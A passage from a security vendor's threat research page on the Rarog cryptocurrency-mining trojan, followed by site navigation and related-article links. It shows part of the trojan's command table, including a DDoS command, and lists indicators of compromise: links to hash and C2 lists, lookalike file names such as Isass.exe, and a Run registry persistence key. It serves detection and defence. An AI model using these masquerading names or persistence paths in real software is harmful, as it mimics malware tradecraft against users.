<td width="138">open_url</td>
<td width="486">Open the specified URL in browser</td>
</tr>
<tr>
<td width="138">ddos</td>
<td width="486">Perform DDoS operations against specified target</td>
</tr>
<tr>
<td width="138">update</td>
<td width="486">Update Rarog Trojan from specified URL</td>
</tr>
<tr>
<td width="138">restart_bot</td>
<td width="486">Restart Rarog Trojan</td>
</tr>
<tr>
<td width="138">delete_bot</td>
<td width="486">Delete Rarog Trojan</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
<strong>SHA256 Hashes</strong><br />
For a full list of SHA256 hashes and their first encountered timestamp, please refer to the following <a href="https://github.com/pan-unit42/iocs/blob/master/rarog/sha256_w_timestamps.csv">file</a>.<br />
&nbsp;<br />
<strong>C2 Servers</strong><br />
For a full list of C2 servers and their first encountered timestamp, please refer to the following <a href="https://github.com/pan-unit42/iocs/blob/master/rarog/c2_w_timestamps.csv">file</a>.<br />
&nbsp;<br />
<strong>File and Folder Artifacts</strong><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\System32\</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\System32\_Isass.exe</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\driver.dat</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\WindowsAppCertification\</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\WindowsAppCertification\WindowHelperStorageHostSystemThread.ps1</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\WindowsAppCertification\cert.cmd</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\WindowsAppCertification\checker.vbs</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\Helpers\</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\Helpers\SecurityHeaIthService.exe</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\Helpers\SystemldleProcess.exe</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\Helpers\winIogon.exe</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\</span><br />
<span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\MicrosoftCorporation\Windows\Modules</span><br />
&nbsp;<br />
<strong>Registry Artifacts</strong><br />
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows_Antimalware_Host_Syst<br />
&nbsp;</p>
      
              </div>
              <!--<span class="post__date">Updated 1 November, 2018 at 1:04 PM PDT</span>-->
              <button class="l-btn back-to-top" id="backToTop" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:back to top">Back to top</button>
              
			<div class="be__tags-wrapper"> 
				<h3>Tags</h3><ul role="list"><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/cryptocurrency-mining/" role="link" title="Cryptocurrency mining" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:tags:Cryptocurrency mining">Cryptocurrency mining</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/monero/" role="link" title="Monero" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:tags:Monero">Monero</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/rarog/" role="link" title="Rarog" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:tags:Rarog">Rarog</a></li></ul>
			</div> 
              <div class="be__post-nav">
    <a class="prev" href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:article-nav:Threat Research Center"> 
        <span>Threat Research Center</span>
    </a>
            <a class="next" href="https://unit42.paloaltonetworks.com/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/" role="link" title="TeleRAT: Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:article-nav:TeleRAT: Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users"> 
            <span>Next: TeleRAT: Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users</span>
        </a>
    </div>
 
            </div>
            <div class="be__nav">
            <div class="be__nav-wrapper">
   
        <div class="be-related-articles">
        <h3>Related Articles</h3>
        <ul> 
                        <li>
                  <a href="https://unit42.paloaltonetworks.com/glupteba-malware-uefi-bootkit/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:sidebar:related-articles:Diving Into Glupteba&#039;s UEFI Bootkit">
                      Diving Into Glupteba&#039;s UEFI Bootkit                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/internet-threats-late-2022/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:sidebar:related-articles:Recent Trends in Internet Threats: Common Industries Impersonated in Phishing Attacks, Web Skimmer Analysis and More">
                      Recent Trends in Internet Threats: Common Industries Impersonated in Phishing Attacks, Web Skimmer Analysis and More                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/purpleurchin-steals-cloud-resources/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:sidebar:related-articles:PurpleUrchin Bypasses CAPTCHA and Steals Cloud Platform Resources">
                      PurpleUrchin Bypasses CAPTCHA and Steals Cloud Platform Resources                  </a>
              </li>
                      </ul>
      </div>
      </div> 
            </div>
          </div>
        </div>
          <div class="pa related-threat">
    <div class="l-container">
            <h2>Related  Resources</h2>
      <div class="blog-slider" id="blogSlider"> 
                    <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of attackers leveraging Active Directory or LDAP. Close-up view of a server rack panel with illuminated lights and a digital display reading &#039;SYSTEM HACKED&#039;." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-17T23:00:43+00:00">December 17, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory">
                    <h4 class="post-title">LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/stately-taurus/" title="Stately Taurus" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:Stately Taurus">Stately Taurus</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/alphv/" title="ALPHV" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:ALPHV">ALPHV</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/" title="LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of HeartCrypt. A laptop on a desk displaying a vivid graphical interface with cyber security and data analytics themes, illuminated by red ambient lighting." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-13T23:00:21+00:00">December 13, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation">
                    <h4 class="post-title">Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/redline-infostealer/" title="Redline infostealer" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Redline infostealer">Redline infostealer</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/lumma-stealer/" title="Lumma Stealer" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Lumma Stealer">Lumma Stealer</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remcos/" title="Remcos" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Remcos">Remcos</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/" title="Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of suspicious registration scam campaigns. Close-up image of a glowing red WiFi connectivity symbol on a textured black surface, symbolizing digital security technology." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-06T23:00:40+00:00">December 6, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams">
                    <h4 class="post-title">Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/network-scanning/" title="network scanning" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:network scanning">Network scanning</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/cybersquatting/" title="cybersquatting" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:cybersquatting">Cybersquatting</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/chatgpt/" title="ChatGPT" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:ChatGPT">ChatGPT</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/" title="Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/09_Cybercrime_Category_1920x900-786x368.jpg" class="lozad" alt="A pictorial representation of Akira ransomware, distributed by Howling Scorpius. A person&#039;s hand typing on a keyboard with a digital screen displaying the word &quot;password&quot; highlighted in blue, set against a backdrop of various cybersecurity interface graphics." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/09_Cybercrime_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/09_Cybercrime_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/09_Cybercrime_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/09_Cybercrime_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/09_Cybercrime_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Howling Scorpius (Akira Ransomware):High Profile Threats"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/top-threats.svg" alt=" category icon">High Profile Threats</span></a>                        <span class="post-pub-date"><time datetime="2024-12-02T23:00:10+00:00">December 2, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Howling Scorpius (Akira Ransomware)">
                    <h4 class="post-title">Threat Assessment: Howling Scorpius (Akira Ransomware)</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/howling-scorpius/" title="Howling Scorpius" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Howling Scorpius (Akira Ransomware):Howling Scorpius">Howling Scorpius</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/leak-site/" title="Leak site" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Howling Scorpius (Akira Ransomware):Leak site">Leak site</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/torrenting/" title="torrenting" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Howling Scorpius (Akira Ransomware):torrenting">Torrenting</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/" title="Threat Assessment: Howling Scorpius (Akira Ransomware)" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Howling Scorpius (Akira Ransomware):read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-786x368.jpg" class="lozad" alt="Close-up of a person wearing glasses, reflecting computer code on the lens." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-22T11:00:26+00:00">November 22, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples">
                    <h4 class="post-title">Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remote-code-execution/" title="Remote Code Execution" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:Remote Code Execution">Remote Code Execution</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:Python">Python</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/macos/" title="macOS" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:macOS">MacOS</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/" title="Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Ransomware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of a threat like BlackSuit ransomware. An illustration of a modern workspace with a laptop displaying cybersecurity icons, surrounded by stacks of coins and a credit card, all depicted in a neon, digital art style." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Ransomware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Ransomware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Ransomware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Ransomware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Ransomware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware:High Profile Threats"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/top-threats.svg" alt=" category icon">High Profile Threats</span></a>                        <span class="post-pub-date"><time datetime="2024-11-20T11:00:53+00:00">November 20, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware">
                    <h4 class="post-title">Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/blacksuit-ransomware/" title="BlackSuit ransomware" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware:BlackSuit ransomware">BlackSuit ransomware</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/construction/" title="construction" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware:construction">Construction</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/education/" title="Education" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware:Education">Education</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/" title="Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of FrostyGoop malware. Close-up view of a digital screen displaying a pixelated, abstract image, possibly representing a face." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-19T11:00:15+00:00">November 19, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications">
                    <h4 class="post-title">FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/bustleberm/" title="BUSTLEBERM" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:BUSTLEBERM">BUSTLEBERM</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/frostygoop/" title="FrostyGoop" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:FrostyGoop">FrostyGoop</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/go/" title="Go" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:Go">Go</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/" title="FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:read now">
